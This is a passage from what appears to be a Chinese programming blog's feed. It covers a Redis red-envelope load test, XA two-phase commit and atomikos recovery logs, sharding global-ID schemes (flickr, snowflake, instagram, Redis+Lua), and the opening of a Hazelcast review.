class="keyword">void</span> <span class="title">generateTestData</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">		Jedis jedis = <span class="keyword">new</span> Jedis(host);</span><br><span class="line">		jedis.flushAll();</span><br><span class="line">		<span class="keyword">final</span> CountDownLatch latch = <span class="keyword">new</span> CountDownLatch(threadCount);</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; threadCount; ++i) &#123;</span><br><span class="line">			<span class="keyword">final</span> <span class="keyword">int</span> temp = i;</span><br><span class="line">			Thread thread = <span class="keyword">new</span> Thread() &#123;</span><br><span class="line">				<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">					Jedis jedis = <span class="keyword">new</span> Jedis(host);</span><br><span class="line">					<span class="keyword">int</span> per = honBaoCount/threadCount;</span><br><span class="line">					JSONObject object = <span class="keyword">new</span> JSONObject();</span><br><span class="line">					<span class="keyword">for</span>(<span class="keyword">int</span> j = temp * per; j &lt; (temp+<span class="number">1</span>) * per; j++) &#123;</span><br><span class="line">						object.put(<span class="string">"id"</span>, j);</span><br><span class="line">						object.put(<span class="string">"money"</span>, j);</span><br><span class="line">						jedis.lpush(hongBaoList, object.toJSONString());</span><br><span class="line">					&#125;</span><br><span class="line">					latch.countDown();</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;;</span><br><span class="line">			thread.start();</span><br><span class="line">		&#125;</span><br><span class="line">		latch.await();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">static</span> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testTryGetHongBao</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">		<span class="keyword">final</span> CountDownLatch latch = <span class="keyword">new</span> CountDownLatch(threadCount);</span><br><span class="line">		System.err.println(<span class="string">"start:"</span> + System.currentTimeMillis()/<span class="number">1000</span>);</span><br><span class="line">		watch.start();</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; threadCount; ++i) &#123;</span><br><span class="line">			<span class="keyword">final</span> <span class="keyword">int</span> temp = i;</span><br><span class="line">			Thread thread = <span class="keyword">new</span> Thread() &#123;</span><br><span class="line">				<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">					Jedis jedis = <span class="keyword">new</span> Jedis(host);</span><br><span class="line">					String sha = jedis.scriptLoad(tryGetHongBaoScript);</span><br><span class="line">					<span class="keyword">int</span> j = honBaoCount/threadCount * temp;</span><br><span class="line">					<span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">						Object object = jedis.eval(tryGetHongBaoScript, <span class="number">4</span>, hongBaoList, hongBaoConsumedList, hongBaoConsumedMap, <span class="string">""</span> + j);</span><br><span class="line">						j++;</span><br><span class="line">						<span class="keyword">if</span> (object != <span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="comment">//							System.out.println("get hongBao:" + object);</span></span><br><span class="line">						&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">							<span class="comment">//已经取完了</span></span><br><span class="line">							<span class="keyword">if</span>(jedis.llen(hongBaoList) == <span class="number">0</span>)</span><br><span class="line">								<span class="keyword">break</span>;</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">					latch.countDown();</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;;</span><br><span class="line">			thread.start();</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		latch.await();</span><br><span class="line">		watch.stop();</span><br><span class="line">		</span><br><span class="line">		System.err.println(<span class="string">"time:"</span> + watch.getTotalTimeSeconds());</span><br><span class="line">		System.err.println(<span class="string">"speed:"</span> + honBaoCount/watch.getTotalTimeSeconds());</span><br><span class="line">		System.err.println(<span class="string">"end:"</span> + System.currentTimeMillis()/<span class="number">1000</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>测试结果20个线程，每秒可以抢2.5万个，足以应付绝大部分的抢红包场景。</p>
<p>如果是真的应付不了，拆分到几个redis集群里，或者改为批量抢红包，也足够应付。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>redis的抢红包方案，虽然在极端情况下（即redis挂掉）会丢失一秒的数据，但是却是一个扩展性很强，足以应付高并发的抢红包方案。</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>redis</tag>
        <tag>lua</tag>
      </tags>
  </entry>
  <entry>
    <title>扯谈下XA事务</title>
    <url>/about-xa-transaction/</url>
    <content><![CDATA[<h2 id="普通事务"><a href="#普通事务" class="headerlink" title="普通事务"></a>普通事务</h2><p>普通事务的实现是比较好理解的。以jdbm3为例，大概是这样的过程：</p>
<p>每个事务都新建一个事务文件，当commit时，先把修改过的数据块，写到事务文件里，然后再一次性地写到数据库文件里。</p>
<p>如果commit时挂掉了，那么重启之后，会再次从事务文件里把修改过的块写到数据库文件里。最后再删除事务文件。</p>
<p><a href="https://github.com/jankotek/JDBM3" target="_blank" rel="noopener">https://github.com/jankotek/JDBM3</a></p>
<p>但是XA事务，即所谓的分布式事务却令人感到云里雾里。一是资料很少，网上的各种配置资料都是流于表面；二是可能实际应用的人也少。</p>
<p>最近研究了下，算是找到点门道了。</p>
<h2 id="二阶段提交（Two-phase-Commit）"><a href="#二阶段提交（Two-phase-Commit）" class="headerlink" title="二阶段提交（Two-phase Commit）"></a>二阶段提交（Two-phase Commit）</h2><p>首先，XA事务是基于二阶段提交（Two-phase Commit）实现的。二阶段提交本身并没有什么令人疑惑的地方。看wiki就可以知道是怎么回事了。</p>
<p>简而言之，有二种角色，事务管理者（DM, Transaction Manager），资源管理器（RM, Resource Manager），通常即数据库或者JMS服务器。</p>
<p>下面两个图片来自：<a href="http://www.infoq.com/cn/articles/xa-transactions-handle" target="_blank" rel="noopener">http://www.infoq.com/cn/articles/xa-transactions-handle</a></p>
<p><img src="/img/xa-commit.png" alt></p>
<p>出错回滚：</p>
<p><img src="/img/xa-rollback.png" alt></p>
<p>当然，还有各种中间出错时，要处理的情况，详细可以看infoq的原文。</p>
<h2 id="令人疑惑的atomikos"><a href="#令人疑惑的atomikos" class="headerlink" title="令人疑惑的atomikos"></a>令人疑惑的atomikos</h2><p>二阶段提交协议是很容易理解的，但是真正令我疑惑的是Java实现的atomikos，一个分布式事务的Transaction Manager组件。</p>
<p>开始的时候，我以为事务管理器(TM)都是独立的一个服务，或者一个独立的进程，它和资源管理器(RM)之间通过网络通迅。</p>
<p>但是在网上看一些atomikos配置文章，都没有提到如何配置一个独立的Transaction Manager，只是简单地介绍了下如何配置atomikos，这些配置都是和应用在一起的。</p>
<p><strong>而从配置里面也没法看出是如何保证在事务过程中，如果应用的进程挂掉后，是如何恢复的。</strong></p>
<p>再把atomikos的例子代码下载下来，发现也没有提到是如何保证事务在失败后，如何协调的。</p>
<p>比如，在第二段提交时，当RM1 commit完成了，而RM2 commit还没有完成，而这时TM，即配置了atomikos的应用程序崩溃，那么这个事务并没有完成，还需要TM重启后协调，才能最终完成这个事务。但是没看到恢复部分的配置。</p>
<p>没办法，只能亲自跑一遍代码了。</p>
<p>跑了下atomikos的代码，在第二阶段提交时，把进程杀掉，发现的确是可以自动处理回滚事务，或者再次提交的。那么信息是保存在哪里的？也没有看到有什么配置文件。</p>
<p>最终，只能下XA的规范下载下来，再一点点慢慢看。</p>
<p>在The XA Specification里的2.3小节：Transaction Completion and Recovery 明确提到TM是要记录日志的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">In Phase 2, the TM issues all RMs an actual request to commit or roll back the</span><br><span class="line"></span><br><span class="line">transaction branch, as the case may be. (Before issuing requests to commit, the TM</span><br><span class="line"></span><br><span class="line">stably records the fact that it decided to commit, as well as a list of all involved RMs.)</span><br><span class="line"></span><br><span class="line">All RMs commit or roll back changes to shared resources and then return status to the</span><br><span class="line"></span><br><span class="line">TM. The TM can then discard its knowledge of the global transaction.</span><br></pre></td></tr></table></figure>
<p>TM是一定要把事务的信息，比如XID，哪个RM已经完成了等保存起来的。只有当全部的RM提交或者回滚完后，才能丢弃这些事务的信息。</p>
<p>于是再查看下atomikos例子运行目录，果然有一些文件日志文件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.1.1.tm13.epoch</span><br><span class="line">tmlog13.log</span><br><span class="line">tmlog.lck</span><br><span class="line">tm.out</span><br><span class="line">tm.out.lck</span><br></pre></td></tr></table></figure>
<p><strong>原来atomikos是通过在应用的目录下生成日志文件来保证，如果失败，在重启后可以通过日志来完成未完成的事务。</strong></p>
<h2 id="XA事务的假设条件"><a href="#XA事务的假设条件" class="headerlink" title="XA事务的假设条件"></a>XA事务的假设条件</h2><p>从XA的规范里找到了下面的说法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">The X/Open DTP model makes these assumptions:</span><br><span class="line"></span><br><span class="line">TMs and RMs have access to stable storage    TM和RM都有牢靠的存储</span><br><span class="line"></span><br><span class="line">TMs coordinate and control recovery   TM协调和控制恢复流程</span><br><span class="line"></span><br><span class="line">RMs provide for their own restart and recovery of their own state. On request, an RM must give a TM a list of XIDs that the RM has prepared for commitment or has heuristically completed.   RM在得启和恢复时，得回应TM的请求，返回一系列的XID，是prepared的，或者是已经启发式地完成了的</span><br></pre></td></tr></table></figure>
<p>也就是说，XA事务都假定了TM和RM都是有牢靠的存储的，所以也保证了TM重启后可以从日志里恢复还没处理完的事务。</p>
<p>TM可以向RM查询事务的状态，RM必须要返回一系列事务的XID，表明事务是prepared状态，还是已经commit的状态。</p>
<p>到这里，应该很明了了，XA事务是其限制的，而TM是XA事务的一个单点，TM必须要非常地牢靠。</p>
<p>从XA的接口函数，就可以大概看出协议是怎么工作的（来自XA规范文档）：</p>
<p><img src="/img/xa-method.png" alt></p>
<h2 id="如何避免XA事务"><a href="#如何避免XA事务" class="headerlink" title="如何避免XA事务"></a>如何避免XA事务</h2><p>XA事务的明显问题是timeout问题，比如当一个RM出问题了，那么整个事务只能处于等待状态。这样可以会连锁反应，导致整个系统都很慢，最终不可用。</p>
<p>避免使用XA事务的方法通常是最终一致性。</p>
<p>举个例子，比如用户充值300元，为了减少DB的压力，先把这个放到消息队列里，然后后端再从消息队列里取出消息，更新DB。</p>
<p>那么如何保证，这条消息不会被重复消费？或者重复消费后，仍能保证结果是正确的？</p>
<ol>
<li>在消息里带上用户帐号在数据库里的版本，在更新时比较数据的版本，如果相同则加上300；</li>
<li>比如用户本来有500元，那么消息是更新用户的钱数为800，而不是加上300；</li>
<li>另外建一个消息是否被消费的表，记录消息ID，在事务里，先判断消息是否已经消息过，如果没有，则更新数据库，加上300,否则说明已经消费过了，丢弃。</li>
</ol>
<p>前面两种方法都必须从流程上保证是单方向的，不能插入其它的东东。</p>
<h2 id="其它的一些东东"><a href="#其它的一些东东" class="headerlink" title="其它的一些东东"></a>其它的一些东东</h2><p>貌似一直有人想用zookeeper来实现2pc，或者类似的东东，因为zookeeper是比较可靠的。但是感觉也没有办法解决timeout问题。</p>
<p>微软的XA事务恢复流程的文档：</p>
<p><a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms681775(v=vs.85).aspx" target="_blank" rel="noopener">http://msdn.microsoft.com/en-us/library/windows/desktop/ms681775(v=vs.85).aspx</a></p>
<p>There are two forms of XA transaction recovery, as follows:</p>
<ul>
<li><p>Cold recovery. Cold recovery performed if the transaction manager process fails while a connection to an XA resource manager is open. When the transaction manager restarts, it reads the transaction manager log file and re-establishes the connection to the XA resource manager by calling xa_open_entry. It then initiates XA recover by calling xa_recover_entry.</p>
</li>
<li><p>Hot recovery. Hot recovery is performed if the transaction manager remains up while the connection between the transaction manager and the XA resource manager fails because the XA resource manager or the network fails. After the failure, the transaction manager periodically calls xa_open_entry to reconnect to the XA resource manager. When the connection is reestablished, the transaction manager initiates XA recovery by calling xa_recover_entry.</p>
</li>
</ul>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>XA事务没有什么神秘的地方，二阶段提交也是一个人们很自然的一个处理方式。</p>
<p>只不过，这个是规范，如果有多个资源之间要协调，而且都支持XA事务，那么会比较方便 。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li>The XA Specification 下载：<a href="http://download.csdn.net/detail/hengyunabc/6940529" target="_blank" rel="noopener">http://download.csdn.net/detail/hengyunabc/6940529</a></li>
<li><a href="http://en.wikipedia.org/wiki/Two-phase_commit_protocol" target="_blank" rel="noopener">http://en.wikipedia.org/wiki/Two-phase_commit_protocol</a></li>
<li><a href="http://www.infoq.com/cn/articles/xa-transactions-handle" target="_blank" rel="noopener">http://www.infoq.com/cn/articles/xa-transactions-handle</a></li>
<li><a href="http://java.sun.com/javaee/technologies/jta/index.jsp" target="_blank" rel="noopener">http://java.sun.com/javaee/technologies/jta/index.jsp</a>    </li>
<li><a href="https://github.com/bitronix/btm" target="_blank" rel="noopener">https://github.com/bitronix/btm</a>  一个开源的JTA Transaction Manager</li>
</ul>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>database</tag>
        <tag>transaction</tag>
      </tags>
  </entry>
  <entry>
    <title>分片(Sharding)的全局ID生成</title>
    <url>/sharding-id/</url>
    <content><![CDATA[<p>这里最后redis生成ID的文章已经过时，新的请参考： <a href="http://blog.csdn.net/hengyunabc/article/details/44244951" target="_blank" rel="noopener">http://blog.csdn.net/hengyunabc/article/details/44244951</a></p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>数据在分片时，典型的是分库分表，就有一个全局ID生成的问题。单纯的生成全局ID并不是什么难题，但是生成的ID通常要满足分片的一些要求：</p>
<ul>
<li>不能有单点故障。</li>
<li>以时间为序，或者ID里包含时间。这样一是可以少一个索引，二是冷热数据容易分离。</li>
<li>可以控制ShardingId。比如某一个用户的文章要放在同一个分片内，这样查询效率高，修改也容易。</li>
<li>不要太长，最好64bit。使用long比较好操作，如果是96bit，那就要各种移位相当的不方便，还有可能有些组件不能支持这么大的ID。</li>
</ul>
<p>先来看看老外的做法，以时间顺序：</p>
<h2 id="flickr"><a href="#flickr" class="headerlink" title="flickr"></a>flickr</h2><p>flickr巧妙地使用了mysql的自增ID，及replace into语法，十分简洁地实现了分片ID生成功能。</p>
<p>首先，创建一个表：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`Tickets64`</span> (</span><br><span class="line">  <span class="string">`id`</span> <span class="built_in">bigint</span>(<span class="number">20</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> auto_increment,</span><br><span class="line">  <span class="string">`stub`</span> <span class="built_in">char</span>(<span class="number">1</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">default</span> <span class="string">''</span>,</span><br><span class="line">  PRIMARY <span class="keyword">KEY</span>  (<span class="string">`id`</span>),</span><br><span class="line">  <span class="keyword">UNIQUE</span> <span class="keyword">KEY</span> <span class="string">`stub`</span> (<span class="string">`stub`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=MyISAM</span><br></pre></td></tr></table></figure>
<p>使用上面的sql可以得到一个ID：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">REPLACE</span> <span class="keyword">INTO</span> Tickets64 (stub) <span class="keyword">VALUES</span> (<span class="string">'a'</span>);</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">LAST_INSERT_ID</span>();</span><br></pre></td></tr></table></figure>
<p>因为使用了replace into的语法，实际上，Tickets64这个表里的数据永远都是这样的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+-------------------+------+</span><br><span class="line">| id                | stub |</span><br><span class="line">+-------------------+------+</span><br><span class="line">| 72157623227190423 |    a |</span><br><span class="line">+-------------------+------+</span><br></pre></td></tr></table></figure>
<p>那么如何解决单点故障呢？<br>很简单，利用mysql的自增ID即可。比如有两台ID生成服务器，设置成下面即可：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">TicketServer1:</span><br><span class="line">auto-increment-increment = 2</span><br><span class="line">auto-increment-offset = 1</span><br><span class="line"> </span><br><span class="line">TicketServer2:</span><br><span class="line">auto-increment-increment = 2</span><br><span class="line">auto-increment-offset = 2</span><br></pre></td></tr></table></figure>
<p>优点：</p>
<ul>
<li>简单可靠。</li>
</ul>
<p>缺点：</p>
<ul>
<li>ID只是一个ID，没有带入时间，shardingId等信息。</li>
</ul>
<h2 id="twitter"><a href="#twitter" class="headerlink" title="twitter"></a>twitter</h2><p>twitter利用zookeeper实现了一个全局ID生成的服务snowflake，<a href="https://github.com/twitter/snowflake，可以生成全局唯一的64bit" target="_blank" rel="noopener">https://github.com/twitter/snowflake，可以生成全局唯一的64bit</a> ID。</p>
<p>生成的ID的构成：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">时间--用前面41 bit来表示时间，精确到毫秒，可以表示69年的数据</span><br><span class="line">机器ID--用10 bit来表示，也就是说可以部署1024台机器</span><br><span class="line">序列数--用12 bit来表示，意味着每台机器，每毫秒最多可以生成4096个ID</span><br></pre></td></tr></table></figure>
<p>优点：</p>
<ul>
<li>充分把信息保存到ID里。</li>
</ul>
<p>缺点：</p>
<ul>
<li>结构略复杂，要依赖zookeeper。</li>
<li>分片ID不能灵活生成。</li>
</ul>
<h2 id="instagram"><a href="#instagram" class="headerlink" title="instagram"></a>instagram</h2><p>instagram参考了flickr的方案，再结合twitter的经验，利用Postgres数据库的特性，实现了一个更简单可靠的ID生成服务。</p>
<p>instagram是这样设计它们的ID的：</p>
<ul>
<li>使用41 bit来存放时间，精确到毫秒，可以使用41年。</li>
<li>使用13 bit来存放逻辑分片ID。</li>
<li>使用10 bit来存放自增长ID，意味着每台机器，每毫秒最多可以生成1024个ID</li>
</ul>
<p>以instagram举的例子为说明：</p>
<p>假定时间是September 9th, 2011, at 5:00pm，则毫秒数是1387263000（直接使用系统得到的从1970年开始的毫秒数）。那么先把时间数据放到ID里：</p>
<p><code>id = 1387263000 &lt;&lt; (64-41)</code></p>
<p>再把分片ID放到时间里，假定用户ID是31341，有2000个逻辑分片，则分片ID是31341 % 2000 -&gt; 1341：</p>
<p><code>id |= 1341 &lt;&lt; (64-41-13)</code></p>
<p>最后，把自增序列放ID里，假定前一个序列是5000,则新的序列是5001：</p>
<p><code>id |= (5001 % 1024)</code></p>
<p>这样就得到了一个全局的分片ID。</p>
<p>下面列出instagram使用的Postgres schema的sql：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">REATE OR <span class="keyword">REPLACE</span> <span class="keyword">FUNCTION</span> insta5.next_id(<span class="keyword">OUT</span> <span class="keyword">result</span> <span class="built_in">bigint</span>) <span class="keyword">AS</span> $$</span><br><span class="line"><span class="keyword">DECLARE</span></span><br><span class="line">    our_epoch <span class="built_in">bigint</span> := <span class="number">1314220021721</span>;</span><br><span class="line">    seq_id bigint;</span><br><span class="line">    now_millis bigint;</span><br><span class="line">    shard_id int := 5;</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">    <span class="keyword">SELECT</span> <span class="keyword">nextval</span>(<span class="string">'insta5.table_id_seq'</span>) %% <span class="number">1024</span> <span class="keyword">INTO</span> seq_id;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">SELECT</span> <span class="keyword">FLOOR</span>(<span class="keyword">EXTRACT</span>(EPOCH <span class="keyword">FROM</span> clock_timestamp()) * <span class="number">1000</span>) <span class="keyword">INTO</span> now_millis;</span><br><span class="line">    result := (now_millis - our_epoch) &lt;&lt; 23;</span><br><span class="line">    result := result | (shard_id &lt;&lt; 10);</span><br><span class="line">    result := result | (seq_id);</span><br><span class="line"><span class="keyword">END</span>;</span><br><span class="line">$$ LANGUAGE PLPGSQL;</span><br></pre></td></tr></table></figure>
<p>则在插入新数据时，直接用类似下面的SQL即可（连请求生成ID的步骤都省略了！）：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> insta5.our_table (</span><br><span class="line">    <span class="string">"id"</span> <span class="built_in">bigint</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> insta5.next_id(),</span><br><span class="line">    ...rest <span class="keyword">of</span> <span class="keyword">table</span> schema...</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>即使是不懂Postgres数据库，也能从上面的SQL看出个大概。把这个移植到mysql上应该也不是什么难事。</p>
<p>缺点：</p>
<ul>
<li>貌似真的没啥缺点。</li>
</ul>
<p>优点：</p>
<ul>
<li><p>充分把信息保存到ID里。</p>
</li>
<li><p>充分利用数据库自身的机制，程序完全不用额外处理，直接插入到对应的分片的表即可。</p>
</li>
</ul>
<h2 id="使用redis的方案"><a href="#使用redis的方案" class="headerlink" title="使用redis的方案"></a>使用redis的方案</h2><p>站在前人的肩膀上，我想到了一个利用redis + lua的方案。</p>
<p>首先，lua内置的时间函数不能精确到毫秒，因此先要修改下redis的代码，增加currentMiliseconds函数，我偷懒，直接加到math模块里了。</p>
<p>修改redis代码下的scripting.c文件，加入下面的内容：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/time.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">redis_math_currentMiliseconds</span> <span class="params">(lua_State *L)</span></span>;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">scriptingInit</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    lua_pushstring(lua,<span class="string">"currentMiliseconds"</span>);</span><br><span class="line">    lua_pushcfunction(lua,redis_math_currentMiliseconds);</span><br><span class="line">    lua_settable(lua,<span class="number">-3</span>);</span><br><span class="line"> </span><br><span class="line">    lua_setglobal(lua,<span class="string">"math"</span>);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">redis_math_currentMiliseconds</span><span class="params">(lua_State *L)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> <span class="title">now</span>;</span></span><br><span class="line">    gettimeofday(&amp;now, <span class="literal">NULL</span>);</span><br><span class="line">    lua_pushnumber(L, now.tv_sec*<span class="number">1000</span> + now.tv_usec/<span class="number">1000</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个方案直接返回三元组（时间，分片ID，增长序列），当然Lua脚本是非常灵活的，可以自己随意修改。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">时间：redis服务器上的毫秒数</span><br><span class="line">分片ID：由传递进来的参数KEYS[1]%1024得到。</span><br><span class="line">增长序列：由redis上&quot;idgenerator_next_&quot; 为前缀，接分片ID的Key用incrby命令得到。</span><br></pre></td></tr></table></figure>
<p>例如，用户发一个文章，要生成一个文章ID，假定用户ID是14532，则</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">time &lt;-- math.currentMiliseconds();</span><br><span class="line">shardindId  &lt;-- 14532 % 1024;     //即196</span><br><span class="line">articleId &lt;-- incrby idgenerator_next_196 1  //1是增长的步长</span><br></pre></td></tr></table></figure>
<p>用lua脚本表示是：</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="keyword">local</span> step = redis.call(<span class="string">'GET'</span>, <span class="string">'idgenerator_step'</span>);</span><br><span class="line"><span class="keyword">local</span> shardId = KEYS[<span class="number">1</span>] % <span class="number">1024</span>;</span><br><span class="line"><span class="keyword">local</span> <span class="built_in">next</span> = redis.call(<span class="string">'INCRBY'</span>, <span class="string">'idgenerator_next_'</span> .. shardId, step);</span><br><span class="line"><span class="keyword">return</span> &#123;<span class="built_in">math</span>.currentMiliseconds(), shardId, <span class="built_in">next</span>&#125;;</span><br></pre></td></tr></table></figure>
<p>“idgenerator_step”这个key用来存放增长的步长。<br>客户端用eval执行上面的脚本，得到三元组之后，可以自由组合成64bit的全局ID。</p>
<p><strong>上面只是一个服务器，那么如何解决单点问题呢？</strong></p>
<p>上面的“idgenerator_step”的作用就体现出来了。</p>
<p>比如，要部署三台redis做为ID生成服务器，分别是A,B,C。那么在启动时设置redis-A下面的键值：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">idgenerator_step = 3</span><br><span class="line">idgenerator_next_1, idgenerator_next_2, idgenerator_next_3 ... idgenerator_next_1024 = 1</span><br></pre></td></tr></table></figure>
<p>设置redis-B下面的键值：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">idgenerator_step = 3</span><br><span class="line">idgenerator_next_1, idgenerator_next_2, idgenerator_next_3 ... idgenerator_next_1024 = 2</span><br></pre></td></tr></table></figure>
<p>设置redis-C下面的键值：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">idgenerator_step = 3</span><br><span class="line">idgenerator_next_1, idgenerator_next_2, idgenerator_next_3 ... idgenerator_next_1024 = 3</span><br></pre></td></tr></table></figure>
<p>那么上面三台ID生成服务器之间就是完全独立的，而且平等关系的。任意一台服务器挂掉都不影响，客户端只要随机选择一台去用eval命令得到三元组即可。</p>
<p>我测试了下单台的redis服务器每秒可以生成3万个ID。那么部署三台ID服务器足以支持任何的应用了。</p>
<p>测试程序见这里：</p>
<p><a href="https://gist.github.com/hengyunabc/9032295" target="_blank" rel="noopener">https://gist.github.com/hengyunabc/9032295</a></p>
<p>缺点：</p>
<ul>
<li>如果不熟悉lua脚本，可能定制自己的ID规则等比较麻烦。</li>
<li>注意机器时间不能设置为自动同步的，否则可能会因为时间同步，而导致ID重复了。</li>
</ul>
<p>优点：</p>
<ul>
<li>非常的快，而且可以线性部署。</li>
<li>可以随意定制自己的Lua脚本，生成各种业务的ID。</li>
</ul>
<h2 id="其它的东东"><a href="#其它的东东" class="headerlink" title="其它的东东"></a>其它的东东</h2><p>MongoDB的Objectid，这个实在是太长了要12个字节：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ObjectId is a 12-byte BSON type, constructed using:</span><br><span class="line"> </span><br><span class="line">a 4-byte value representing the seconds since the Unix epoch,</span><br><span class="line">a 3-byte machine identifier,</span><br><span class="line">a 2-byte process id, and</span><br><span class="line">a 3-byte counter, starting with a random value.</span><br></pre></td></tr></table></figure>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>生成全局ID并不很难实现的东东，不过从各个网络的做法，及演进还是可以学到很多东东。有时候一些简单现成的组件就可以解决问题，只是缺少思路而已。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="http://code.flickr.net/2010/02/08/ticket-servers-distributed-unique-primary-keys-on-the-cheap/" target="_blank" rel="noopener">http://code.flickr.net/2010/02/08/ticket-servers-distributed-unique-primary-keys-on-the-cheap/</a></li>
<li><a href="http://instagram-engineering.tumblr.com/post/10853187575/sharding-ids-at-instagram" target="_blank" rel="noopener">http://instagram-engineering.tumblr.com/post/10853187575/sharding-ids-at-instagram</a></li>
<li><a href="https://github.com/twitter/snowflake/" target="_blank" rel="noopener">https://github.com/twitter/snowflake/</a></li>
<li><a href="http://docs.mongodb.org/manual/reference/object-id/" target="_blank" rel="noopener">http://docs.mongodb.org/manual/reference/object-id/</a></li>
<li><a href="http://www.redisdoc.com/en/latest/script/eval.html" target="_blank" rel="noopener">http://www.redisdoc.com/en/latest/script/eval.html</a>       redis脚本参考</li>
</ul>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>redis</tag>
        <tag>sharding</tag>
      </tags>
  </entry>
  <entry>
    <title>hazelcast的坑爹事</title>
    <url>/about-hazelcast/</url>
    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>开源中国的简介：</p>
<p>Hazelcast是一个高度可扩展的数据分发和集群平台。特性包括：</p>
<ul>
<li>提供java.util.{Queue, Set, List, Map}分布式实现。</li>
<li>提供java.util.concurrency.locks.Lock分布式实现。</li>
<li>提供java.util.concurrent.ExecutorService分布式实现。</li>
<li>提供用于一对多关系的分布式MultiMap。</li>
<li>提供用于发布/订阅的分布式Topic（主题）。</li>
<li>通过JCA与J2EE容器集成和事务支持。</li>
<li>提供用于安全集群的Socket层加密。</li>
<li>支持同步和异步持久化。</li>
<li>为Hibernate提供二级缓存Provider 。</li>
<li>通过JMX监控和管理集群。</li>
<li>支持动态HTTP Session集群。</li>
<li>利用备份实现动态分割。</li>
<li>支持动态故障恢复。</li>
</ul>
<p>简介是美好的，现实是坑爹的。</p>
<h2 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h2><p>先说下优点吧：</p>
<p>有个Manager Center的管理界面，很漂亮，可以看到很多有用的数据。包括每个Map的请求次数等。这些在Memcached，Redis上只能看个大概。</p>
<p>简单的配置很方便，可以像JDK里的Map，List一样使用。</p>
